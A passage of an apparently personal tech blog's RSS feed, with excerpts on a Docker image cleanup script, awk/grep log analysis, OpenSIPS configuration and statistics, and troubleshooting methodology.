&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# create by wangduanduan&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# when current free disk less then max free disk, you can remove docker images&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GREEN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\033[0;32m&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;RED&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\033[0;31m&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;NC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\033[0m&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;max_free_disk&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 5G. when current free disk less then max free disk, remove docker images&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;current_free_disk&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;df -lh | grep centos-root | awk &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;{print strtonum($4)}&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;df -lh
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;max_free_disk: &lt;/span&gt;$max_free_disk&lt;span style=&#34;color:#e6db74&#34;&gt; G&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo -e &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;current_free_disk: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;GREEN&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;$current_free_disk&lt;span style=&#34;color:#e6db74&#34;&gt; G &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;NC&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; $current_free_disk -lt $max_free_disk &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	echo -e &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;RED&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; need to clean up docker images &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;NC&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	docker images | grep none | awk &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;{print $3 }&amp;#39;&lt;/span&gt; | xargs docker rmi
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	docker images | grep wecloud | awk &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;{print $1&amp;#34;:&amp;#34;$2}&amp;#39;&lt;/span&gt; | xargs docker rmi
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	echo -e &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;GREEN&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;no need clean&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;NC&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;注意事项&#34;&gt;注意事项&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;为了加快打包的速度，一般不要太频繁的删除镜像&lt;/code&gt;。因为老的镜像中的某些不改变的层，可以作为新的镜像的缓存，从而大大加快构建的速度。&lt;/p&gt;</description>
    </item>
    <item>
      <title>awk、grep、cut、sort、uniq简单命令玩转日志分析与统计</title>
      <link>https://wdd.js.org/shell/log-ana/</link>
      <pubDate>Tue, 06 Aug 2019 11:24:53 +0800</pubDate>
      <guid>https://wdd.js.org/shell/log-ana/</guid>
      <description>&lt;p&gt;test.log&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;A&amp;#34; loginIn
2019-1010-1920 192.345.23.1 cause:&amp;#34;BBB&amp;#34; type:&amp;#34;A&amp;#34; loginIn
2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;S&amp;#34; loginIn
2019-1010-1920 192.345.23.1 cause:&amp;#34;BBJ&amp;#34; type:&amp;#34;A&amp;#34; loginIn
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;按列分割&#34;&gt;按列分割&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;提取第三列&lt;/strong&gt;&lt;!-- raw HTML omitted --&gt;日志列数比较少或则要提取的字段比较靠前时，优先使用 awk。当然 cut 也可以做到。&lt;!-- raw HTML omitted --&gt;比如输出日志的第三列&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;awk &amp;#39;{print $3}&amp;#39; test.log // $3表示第三列
cut -d &amp;#34; &amp;#34; -f3 test.log // -f3指定第三列, -d用来指定分割符
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;正则提取&#34;&gt;正则提取&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;提取 cause 字段的原因值？&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;A&amp;#34; loginIn
2019-1010-1920 192.345.23.1 type:&amp;#34;A&amp;#34; loginIn cause:&amp;#34;BBB&amp;#34;
2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;S&amp;#34; loginIn
2019-1010-1920 192.345.23.1 type:&amp;#34;A&amp;#34; cause:&amp;#34;BBJ&amp;#34; loginIn
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;当要提取的内容不在同一列时，往往就无法用cut或者awk就按列提取&lt;/code&gt;。最好用的方式是用 grep 的正则提取。&lt;!-- raw HTML omitted --&gt;好像 grep 不支持捕获分组，所以只能提取出出 cause:&amp;ldquo;AAA&amp;rdquo;，而无法直接提取出 AAA&lt;/p&gt;</description>
    </item>
    <item>
      <title>条件语句特点</title>
      <link>https://wdd.js.org/opensips/ch5/condition/</link>
      <pubDate>Mon, 05 Aug 2019 09:57:20 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch5/condition/</guid>
      <description>&lt;h1 id=&#34;if语句中的真和假值&#34;&gt;if语句中的真和假值&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;假值&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;负数: -1, -2, -3, -4&lt;/li&gt;
&lt;li&gt;null: hdr(not_exist) 然而这个not_exist头并不存在&lt;/li&gt;
&lt;li&gt;&amp;ldquo;&amp;rdquo;: 空字符串&lt;/li&gt;
&lt;li&gt;0&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;真值：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;非空字符串: &amp;ldquo;acb&amp;rdquo;&lt;/li&gt;
&lt;li&gt;正数: 1,2,3&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>opensips启动失败没有任何报错日志</title>
      <link>https://wdd.js.org/opensips/ch7/without-log/</link>
      <pubDate>Fri, 02 Aug 2019 17:48:49 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch7/without-log/</guid>
      <description>&lt;ol&gt;
&lt;li&gt;将opensips.cfg文件中的，log_stderror的值改为yes, 让出错直接输出到标准错误流上，然后opensips start&lt;/li&gt;
&lt;li&gt;如果第一步还是没有日志输出，则opensips -f opensips.cfg&lt;/li&gt;
&lt;/ol&gt;</description>
    </item>
    <item>
      <title>【笔记】操作系统：虚拟化 并发 持久化</title>
      <link>https://wdd.js.org/posts/2019/08/ym77uc/</link>
      <pubDate>Thu, 01 Aug 2019 13:20:13 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/08/ym77uc/</guid>
      <description>&lt;h1 id=&#34;虚拟化&#34;&gt;虚拟化&lt;/h1&gt;
&lt;p&gt;问题：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;操作系统如何虚拟化?&lt;/li&gt;
&lt;li&gt;虚拟化有什么好处?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;操作系统向下控制硬件，向上提供API给应用程序调用。 &lt;/p&gt;
&lt;p&gt;系统的资源是有限的，应用程序都需要资源才能正常运行，所以操作系统也要负责资源的分配和协调。通常计算机有以下的资源。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;cpu&lt;/li&gt;
&lt;li&gt;内存&lt;/li&gt;
&lt;li&gt;磁盘&lt;/li&gt;
&lt;li&gt;网络&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;有些资源可以轮流使用，而有些资源只能被独占使用。&lt;/p&gt;</description>
    </item>
    <item>
      <title>问题排查方法论</title>
      <link>https://wdd.js.org/posts/2019/08/vqergg/</link>
      <pubDate>Thu, 01 Aug 2019 08:20:34 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/08/vqergg/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;处理问题的关键在于收集数据，基于数据找出触发条件。&lt;/p&gt;&lt;/blockquote&gt;
&lt;h1 id=&#34;1-处理步骤&#34;&gt;1. 处理步骤&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;收集信息并记录&lt;/strong&gt;：包括日志，截图，抓包，客户反馈等等。注意：原始数据非常重要，如果不记录下来，有可能再也无法去重现。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;分析数据&lt;/strong&gt;：注意：分析数据不要有提前的结果倾向，否者只会找有利于该倾向的证据。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;给出报告和建议，以及解决方案，并记录存档&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;2-概率维度&#34;&gt;2. 概率维度&lt;/h1&gt;
&lt;p&gt;问题出现的概率，是一个非常重要的指标，需要提前明确&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;必然出现&lt;/strong&gt;：在某个条件下，问题必然出现
&lt;ul&gt;
&lt;li&gt;注意：必然出现的问题，也可能是小范围内的必然，放到大范围内，就不是必然出现。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;偶然出现&lt;/strong&gt;：问题出现有一定的概率性
&lt;ul&gt;
&lt;li&gt;注意：问题偶然出现也并不一定说明问题是偶然的，有可能因为没有找到唯一确定的触发条件，导致问题看起来是偶然的。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;3-特征维度&#34;&gt;3. 特征维度&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;时间特征&lt;/strong&gt;：集中于某一段时间产生&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;地理特征&lt;/strong&gt;：集中于某一片区域产生&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;人群特征&lt;/strong&gt;：集中于某几个人产生&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;设备特征&lt;/strong&gt;：集中于某些电脑或者客户端&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>理解并测量OpenSIPS的内存资源</title>
      <link>https://wdd.js.org/opensips/blog/memory-usage/</link>
      <pubDate>Wed, 31 Jul 2019 13:50:43 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/blog/memory-usage/</guid>
      <description>&lt;p&gt;原文：&lt;a href=&#34;https://blog.opensips.org/2016/12/29/understanding-and-dimensioning-memory-in-opensips/&#34;&gt;https://blog.opensips.org/2016/12/29/understanding-and-dimensioning-memory-in-opensips/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Running OpenSIPS with the right memory configuration is a very important task when developing and maintaining your VoIP service, because it has a direct effect over the scale of your platform, the customers you support, as well as the services you offer. Setting the limit to a low value might make OpenSIPS run out of memory during high volume of traffic, or during complex scenarios, while setting a big value might lead to wasted resources.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Troubleshooting missing ACK in SIP</title>
      <link>https://wdd.js.org/opensips/blog/miss-ack/</link>
      <pubDate>Wed, 31 Jul 2019 13:47:21 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/blog/miss-ack/</guid>
      <description>&lt;p&gt;We all experienced calls getting self disconnected after 5-10 seconds – usually disconnected by the callee side via a &lt;em&gt;&lt;strong&gt;BYE&lt;/strong&gt;&lt;/em&gt; request – but a &lt;em&gt;&lt;strong&gt;BYE&lt;/strong&gt;&lt;/em&gt; which was not triggered by the party behind the phone, but by the SIP stack/layer itself.&lt;!-- raw HTML omitted --&gt;This is one of the most common issues we get in SIP and one of the most annoying in the same time. But why it happens ?&lt;/p&gt;</description>
    </item>
    <item>
      <title>Troubleshooting OpenSIPS script</title>
      <link>https://wdd.js.org/opensips/blog/troubleshooting-opensips-script/</link>
      <pubDate>Wed, 31 Jul 2019 13:43:05 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/blog/troubleshooting-opensips-script/</guid>
      <description>&lt;p&gt;What makes OpenSIPS such an attractive and powerful SIP solutions is its high level of programmability, thanks to its C-like configuration script. But once you get into the “programming” area, you will automatically need tools and skills for troubleshooting.&lt;!-- raw HTML omitted --&gt;So here there are some some tips and tools you can use in OpenSIPS for “debugging” your configuration script.&lt;/p&gt;
&lt;h2 id=&#34;controlling-the-script-logging&#34;&gt;Controlling the script logging&lt;/h2&gt;
&lt;p&gt;The easiest way to troubleshoot your script is of course by using the &lt;a href=&#34;http://www.opensips.org/Documentation/Script-CoreFunctions-2-3#toc57&#34;&gt;&lt;strong&gt;xlog()&lt;/strong&gt;&lt;/a&gt; core function and print your own messages. Still the internal OpenSIPS logs (generated by the OpenSIPS code) do provide a lot of information about what OpenSIPS is doing.&lt;!-- raw HTML omitted --&gt;The challenge with the logging is to control the amount and content of messages you want to log. Otherwise you will end up with huge piles of logs, completely impossible to read and follow.&lt;!-- raw HTML omitted --&gt;By using the &lt;a href=&#34;http://www.opensips.org/Documentation/Script-CoreVar-2-3#log_level&#34;&gt;&lt;strong&gt;$log_level&lt;/strong&gt;&lt;/a&gt; script variable you can dynamically change the logging level (to make it more or less verbose) from the script level. You can do this only for parts of the script:&lt;/p&gt;</description>
    </item>
    <item>
      <title>Running OpenSIPS in the Cloud</title>
      <link>https://wdd.js.org/opensips/blog/runing-opensips-in-cloud/</link>
      <pubDate>Wed, 31 Jul 2019 13:41:55 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/blog/runing-opensips-in-cloud/</guid>
      <description>&lt;p&gt;Cloud computing is a more and more viable option for running and providing SIP services. The question is how compatible are the SIP services with the Cloud environment ? So let’s have a look at this compatibility from the most sensitive (for SIP protocol) perspective – the IP network topology.&lt;!-- raw HTML omitted --&gt;A large number of existing clouds (like &lt;a href=&#34;https://aws.amazon.com/ec2/&#34;&gt;EC2&lt;/a&gt;, &lt;a href=&#34;https://cloud.google.com/&#34;&gt;Google CP&lt;/a&gt;, &lt;a href=&#34;https://azure.microsoft.com/&#34;&gt;Azure&lt;/a&gt;) have a particularity when comes to the topology of the IP network they provide – they do not provide public routable IPs directly on the virtual servers, rather they provide private IPs for the servers and a fronting public IP doing a &lt;a href=&#34;https://wiki.untangle.com/index.php/1:1_NAT&#34;&gt;1-to-1 NAT&lt;/a&gt; to the private one.&lt;!-- raw HTML omitted --&gt;Such a network topology forces you to run the SIP service behind a NAT. Why is this such a bad thing? Because, unlike other protocols (such as HTTP), SIP is very intimate with the IP addresses – the IPs are part of the SIP messages and used for routing. So, a SIP server running on a private IP advertises its listening IP address (the private one) in the SIP traffic – this will completely break the SIP routing, both at transaction and dialog level :&lt;/p&gt;</description>
    </item>
    <item>
      <title>深入OpenSIPS统计引擎</title>
      <link>https://wdd.js.org/opensips/blog/deepin-stat-engine/</link>
      <pubDate>Wed, 31 Jul 2019 13:40:00 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/blog/deepin-stat-engine/</guid>
      <description>&lt;p&gt;无论你是经验丰富的OpenSIPS管理员，或者你仅仅想找到为什么ACK消息在你的网络中循环发送，唯一可以确定的是：我们或早或晚会需要OpenSIPS提供数据来回答以下问题&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;OpenSIPS运行了多久？&lt;/li&gt;
&lt;li&gt;我们是否被恶意流量攻击了？&lt;/li&gt;
&lt;li&gt;我们的平台处理了多少个来自运营商的无效SIP包&lt;/li&gt;
&lt;li&gt;在流量峰值时，OpenSIPS是否拥有足够的内存来支撑运行&lt;/li&gt;
&lt;li&gt;&amp;hellip;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;幸运的是，OpenSIPS提供内置的统计支持，来方便我们快速解决以上问题。详情可以查看&lt;a href=&#34;https://opensips.org/Documentation/Interface-Statistics-2-4&#34;&gt;OpenSIPS统计接口&lt;/a&gt;。在本篇文章中，我们将会了解统计引擎，但是，什么是引擎？&lt;/p&gt;
&lt;h1 id=&#34;统计引擎&#34;&gt;统计引擎&lt;/h1&gt;
&lt;p&gt;总的来说，下图就是OpenSIPS引擎的样子。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/blog/deepin-stat-engine/2022-12-03-15-23-32.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;统计引擎内置于OpenSIPS。它管理所有的统计数据，并且暴露一个标准的CRUD操作接口给所有的模块，让模块可以推送或者管理他们自己的统计数据。&lt;/p&gt;
&lt;p&gt;一下有三种方式来和统计引擎进行交互&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;直接通过脚本访问。如通过$script(my-stat)变量&lt;/li&gt;
&lt;li&gt;使用HTTP请求来访问&lt;/li&gt;
&lt;li&gt;使用opensipsctl fifo命令&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;统计引擎是非常灵活并且可以通过不同方式与其交互，那么它怎么能让我们的使用变得方便呢？下面的一些建议，能够让你全面的发挥静态统计引擎的能力，来增强某些重要的层面。&lt;/p&gt;
&lt;h1 id=&#34;系统开发维护&#34;&gt;系统开发维护&lt;/h1&gt;
&lt;p&gt;当你处理OpenSIPS的DevOps时，你经常需要监控OpenSIPS的一些运行参数。你的关注点不同，那么你就需要监控不同的方面，例如SIP事务、对话、内存使用、系统负载等等&lt;/p&gt;
&lt;p&gt;下面是OpenSIPS统计分组的一个概要，以及组内的每一个统计值，详情可以参考&lt;a href=&#34;https://opensips.org/Documentation/Interface-CoreStatistics-2-4&#34;&gt;wiki&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/blog/deepin-stat-engine/2022-12-03-15-23-44.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;统计简介&#34;&gt;统计简介&lt;/h1&gt;
&lt;p&gt;假如我们想通过sipp对我们的平台进行流量测试，我们想压测期间观测当前的事务、对话、共享内存的值变化。或者我们我们有了一个新的SIP提供商，他们每天早上9点会开始向我们平台推送数据，我们需要监控他们的推送会对我们系统产生的影响。&lt;/p&gt;
&lt;p&gt;你可以在OpenSIPS实例中输入以下指令：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;watch -n0.2 &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;opensipsctl fifo get_statistics inuse_transactions dialog: shmem:&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;注意 get_statistics命令即可以接受一个统计值项，也可以接受一个统计组的项。统计组都是以冒号(:)结尾。&lt;/p&gt;
&lt;h1 id=&#34;与递增的统计指标进行交互&#34;&gt;与递增的统计指标进行交互&lt;/h1&gt;
&lt;p&gt;统计指标看起来相同，实际上分为两类&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;累计值&lt;/strong&gt;。累计是一般是随着时间增长，例如&lt;code&gt;rcv_requests&lt;/code&gt;, &lt;code&gt;processed_dialogs&lt;/code&gt;，表示从某个时间点开始累计收到或者处理了多少个任务&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;计算值&lt;/strong&gt;。计算值一般和系统运行负载有关，和时间无关。例如&lt;code&gt;active_dialogs&lt;/code&gt;, &lt;code&gt;real_used_size&lt;/code&gt;, 这些值都是由内部函数计算出来的计算值&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一般来说，脚本中定义的统计值都是递增的，OpenSIPS无法重新计算它，只能我们自己来计算或者维护它的值。&lt;/p&gt;
&lt;p&gt;以下方式可以快速查看计算值类的统计项&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;opensipsctl fifo list_statistics
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;某些场景，你可能需要周期性的重置累计值类的统计项。例如你可以只需要统计当天的&lt;code&gt;processed_dialogs&lt;/code&gt;，&lt;code&gt;daily_routed_minutes&lt;/code&gt;，那么你只需要设置一个定时任务，每天0点，重置这些统计值。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;opensipsctl fifo reset_statistics processed_dialogs
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;在脚本中自定义统计项&#34;&gt;在脚本中自定义统计项&lt;/h1&gt;
&lt;p&gt;在脚本中自定义统计项是非常简单的，只需要做两步&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;加载&lt;code&gt;statistics.so&lt;/code&gt;模块&lt;/li&gt;
&lt;li&gt;在某些位置调用函数, &lt;code&gt;update_stat(&amp;quot;daily_routed_minutes&amp;quot;, &amp;quot;+1&amp;quot;)&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;实战脚本中有许多的自定义统计项&#34;&gt;实战：脚本中有许多的自定义统计项&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;统计每天收到的SIP消息的请求方式, 以及处理的消息长度&lt;/li&gt;
&lt;li&gt;每隔24小时，以JSON的形式，将消息写到SIP服务器&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 设置统计组&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;statistics&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stat_groups&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;method, packet&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 请求路由&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;route &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    update_stat&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;method:&lt;/span&gt;$rm&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;+1&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    update_stat&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;packet:count&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;+1&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
